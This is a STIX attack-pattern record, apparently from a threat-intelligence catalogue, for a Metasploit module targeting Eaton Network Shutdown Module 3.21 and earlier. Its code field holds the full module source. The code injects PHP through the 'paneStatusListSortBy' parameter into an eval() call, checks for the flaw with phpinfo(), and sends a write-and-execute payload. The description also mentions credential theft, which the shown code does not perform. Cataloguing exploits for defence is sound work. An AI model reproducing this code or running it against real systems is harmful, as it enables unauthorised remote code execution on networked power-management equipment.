{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--54dbe686-970e-4e9b-aec7-412686560a2e",
    "created": "2024-08-14T17:08:01.547094Z",
    "modified": "2024-08-14T17:08:01.547098Z",
    "name": "Network Shutdown Module (sort_values) Remote PHP Code Injection",
    "description": " This module exploits a vulnerability in Eaton Network Shutdown Module version <= 3.21, in lib/dbtools.inc which uses unsanitized user input inside a eval() call. Additionally the base64 encoded user credentials are extracted from the database of the application. Please note that in order to be able to steal credentials, the vulnerable service must have at least one USV module (an entry in the \"nodes\" table in mgedb.db) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/eaton_nsm_code_exec.rb",
            "external_id": "eaton_nsm_code_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20121014000855/http://secunia.com/advisories/49103/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Network Shutdown Module (sort_values) Remote PHP Code Injection',\n      'Description'    => %q{\n        This module exploits a vulnerability in Eaton Network Shutdown Module\n        version <= 3.21, in lib/dbtools.inc which uses unsanitized user input\n        inside a eval() call. Additionally the base64 encoded user credentials\n        are extracted from the database of the application. Please note that\n        in order to be able to steal credentials, the vulnerable service must\n        have at least one USV module (an entry in the \"nodes\" table in\n        mgedb.db)\n      },\n      'Author'         =>\n        [\n          'h0ng10',  # original discovery, msf module\n          'sinn3r'   # PhpEXE shizzle\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '83199'],\n          ['URL', 'http://web.archive.org/web/20121014000855/http://secunia.com/advisories/49103/']\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 4000\n        },\n      'Platform'       => %w{ linux php },\n      'Arch'           => ARCH_PHP,\n\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-06-26'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(4679)\n      ])\n  end\n\n  def check\n    # we use a call to phpinfo() for verification\n    res = execute_php_code(\"phpinfo();die();\")\n\n    if not res or res.code != 200\n      vprint_error(\"Failed: Error requesting page\")\n      return CheckCode::Unknown\n    end\n\n    return CheckCode::Vulnerable if (res.body =~ /This program makes use of the Zend/)\n    return CheckCode::Safe\n  end\n\n  def execute_php_code(code, opts = {})\n    param_name = rand_text_alpha(6)\n    padding    = rand_text_alpha(6)\n    url_param  = \"#{padding}%22%5d,%20eval(base64_decode(%24_POST%5b%27#{param_name}%27%5d))%29;%2f%2f\"\n\n    res = send_request_cgi(\n      {\n        'uri'   =>  '/view_list.php',\n        'method' => 'POST',\n        'vars_get' =>\n          {\n            'paneStatusListSortBy' => url_param,\n          },\n        'vars_post' =>\n          {\n            param_name => Rex::Text.encode_base64(code),\n          },\n        'headers' =>\n          {\n            'Connection' => 'Close',\n          }\n      })\n  end\n\n  def no_php_tags(p)\n    p = p.gsub(/^<\\?php /, '')\n    p.gsub(/ \\?\\>$/, '')\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Sending payload\")\n\n    unlink = (target['Platform'] == 'linux') ? true : false\n    p      = no_php_tags(get_write_exec_payload(:unlink_self => unlink))\n\n    execute_php_code(p)\n    handler\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-06-26",
    "x_mitre_platforms": [
        "%w{ linux php }"
    ]
}